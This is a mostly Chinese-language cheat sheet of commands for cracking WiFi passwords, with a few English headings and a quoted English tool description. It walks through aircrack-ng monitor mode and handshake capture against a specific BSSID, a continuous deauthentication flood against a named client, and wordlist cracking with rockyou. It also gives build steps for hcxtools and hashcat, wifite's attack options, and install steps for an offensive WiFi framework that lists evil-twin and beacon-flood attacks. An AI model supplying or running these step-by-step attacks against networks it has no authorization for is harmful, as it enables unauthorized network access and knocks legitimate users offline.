#### airmon-ng
[Word Dictionary](https://www.wirelesshack.org/wpa-wpa2-word-list-dictionaries.html)
[Aircrack-ng套件——無線破解原理及工具詳解](https://www.796t.com/content/1543852627.html)
```
ifconfig   #check wifi interface
sudo -i
airmon-ng start wlan0  //wlan0為前面查到的網絡卡名稱
airodump-ng wlan0mon   # 等待有人登入
# airodump-ng -c <通道> --bssid <路由ID> -w <儲存抓包的目錄名稱> <網絡卡名稱>
airodump-ng -c 3 --bssid D4:EE:07:39:F5:DE -w /root/桌面 wlan0mon
# .洪水攻擊，強制打掉重連
# aireplay-ng -0 0 -a <bssid路由ID> -c <連線wifi的mac IP> <網絡卡名>
aireplay-ng -0 0 -a D4:EE:07:39:F5:DE -c D8:5D:E2:96:AB:EB wlan0mon
#.停止攻擊
#ctrl + c當終端右上方出現：WPA握手：D8：5D：22：96：AB字樣則說明抓包完成，停止攻擊
#抓包完成可關閉監聽模式：root @ kali：〜＃airmon- ng stop wlan0mon（網絡卡名）
airmon-ng stop wlan0mon(網絡卡名)
aircrack-ng -w /usr/share/wordlists/rockyou.txt /root/桌面-1.cap
#// - a2引數：<代表WPA握手包>，可新增至命令執行
#// - w引數：指定字典檔案路徑，rockyou.txt為kali自帶字典，使用前須先解壓：
#root @ kali：〜＃gzip -d /usr/share/wordlists/rockyou.txt.gz
```
```
Aircrack- ng是評估WiFi網路安全性的一整套工具。

- Aircrack-ng無線密碼破解
- Aireplay-ng流量生成和客戶端認證
- Airodump-ng資料包捕獲
- Airbase-ng虛假接入點配置

它側重於無線網路安全的不同領域：

監控：資料包捕獲和資料匯出到文字檔案，以供工具第三方進一步處理
攻擊：通過資料包注入重播攻擊，解除身份驗證，虛假接入點等
測試：檢查無線網路卡和驅動程式功能（捕獲和注入）
破解：WEP和WPA PSK（WPA 1和2）
```
#### [Kali下用wifite破解WIFI](https://www.twblogs.net/a/5c543824bd9eee06ef364074)
#### 下載 hcxdumptool 
```
apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev
git clone https://github.com/ZerBea/hcxtools
cd hcxtools
make
make install
```
#### 下載 hcxdumptool v4.2.0或更高版本
```
git clone https://github.com/ZerBea/hcxdumptool
cd hcxdumptool
make
make install
```
#### 下載 hashcat v4.2.0或更高版本
```
wget https://hashcat.net/files/hashcat-4.2.1.7z
7z x hashcat-4.2.1.7z
```
#### wifite 指令
#### [Wifite+hashcat破解WPA2 Wi-Fi密码](https://www.shenjc.net/2020/07/19/200711_kali_linux_wifi/)
```
可選參數：

-h，--help  顯示此幫助信息並退出

 

命令：

--check CHECK  檢查檢查capfile [文件]進行握手。

--cracked  顯示以前破解的接入點。

--recrack  將已破解的網絡包含在目標中。

 

全局的：

--all  攻擊所有目標。

-i INTERFACE  用於捕獲的無線接口。

--mac  匿名MAC地址。

--mon-iface MONITOR_INTERFACE  界面已經處於監視模式。

-c CHANNEL  通道掃描目標。

-e ESSID  通過ssid（name）指定一個特定的接入點。

-b BSSID  通過bssid（mac）指定特定的接入點。

--showb  掃描後顯示目標BSSID。

--nodeauth  掃描時不要取消對客戶端的驗證

- power POWER  攻擊任何信號強度> [pow]的目標。

--tx TX  設置適配器TX功率級別。

--quiet  不要在掃描期間打印AP列表。

 

WPA：

--wpa  只針對WPA網絡（使用--wps --wep）。

--wpat WPAT  等待WPA攻擊完成的時間（秒）。

--wpadt WPADT  發送deauth數據包（秒）之間的等待時間。

--strip  使用tshark或pyrit去握手。

--crack  使用[dic] wordlist文件破解WPA握手。

--dict DIC  WPA時使用的DIC Specificy字典。

--aircrack  使用aircrack驗證握手。

--pyrit  使用pyrit驗證握手。

--tshark  使用tshark驗證握手。

--cowpatty  使用cowpatty驗證握手。

 

WEP：

--wep  只針對WEP網絡。

--pps PPS  設置每秒要注入的數據包數量。

--wept WEPT 等待每次攻擊，0意味着無窮無盡。

- chopchop  使用chopchop攻擊。

--arpreplay  使用arpreplay攻擊。

--fragment  使用碎片攻擊。

- caffelatte  使用caffe-latte攻擊。

--p0841  使用P0842攻擊。

-- hirte  使用hirte攻擊。

--nofakeauth  假身份驗證失敗後停止攻擊。

--wepca WEPCA  當IVs的數量超過[n]時開始破解。

--wepsave WEPSAVE  將.cap文件的副本保存到此目錄。

 

WPS：

--wps  只針對WPS網絡。

--pixie  只能使用WPS PixieDust攻擊

--wpst WPST  最大在放棄之前等待新的重試（0：從不）。

--wpsratio  成功PIN嘗試/總重試次數的最小比率。

--wpsretry WPSRETRY  放棄之前最多同一個PIN的重試次數。
```
#### Stop wifi crack tools
* sudo airmon-ng stop wlanmon
#### Restart wlan0 connetc to WiFi
```
sudo wpa_supplicant -B -c /etc/wpa_supplicant/wpa_supplicant.conf -i wlan0
sudo dhclient wlan0
sudo ifconfig
```
#### WiFi Exploitation Framework
```
A fully offensive framework to the 802.11 networks and protocols with different types of attacks for WPA/WPA2 and WEP, automated hash cracking, and much more.
To install WEF, you can simply do it in just 3 commands:
Run as root
git clone https://github.com/D3Ext/WEF
cd WEF
bash setup.sh
Supported Attacks:
- Deauthentication Attack
- Authentication Attack
- Beacon Flood Attack
- PMKID Attack
- EvilTwin Attack
- Passive/Stealthy Attack
- Pixie Dust Attack
- Null Pin Attack
- WEP Protocol Attacks
- Michael Exploitation Attack
- GPS Spoofing with HackRF (not finished)
Features:
☑️ Descriptives attack logs
☑️ WPA/WPA2, WPS and WEP Attacks
☑️ Auto handshake cracking
☑️ Multiple templates for EvilTwin attack (even custom)
☑️ Check monitor mode and its status
☑️ 2.4Ghz and 5Ghz attacks
☑️ Custom wordlist selector
☑️ Auto detect requirements
Disclaimer
Creator isn't in charge of any and has no responsibility for any kind of:
- Unlawful or illegal use of the project.
- Legal or Law infringement (acted in any country, state, municipality, place) by third parties and users.
- Act against ethical and / or human moral, ethic, and peoples of the world.
- Malicious act, capable of causing damage to third parties, promoted or distributed by third parties or the user through this software.
https://github.com/D3Ext/WEF
```
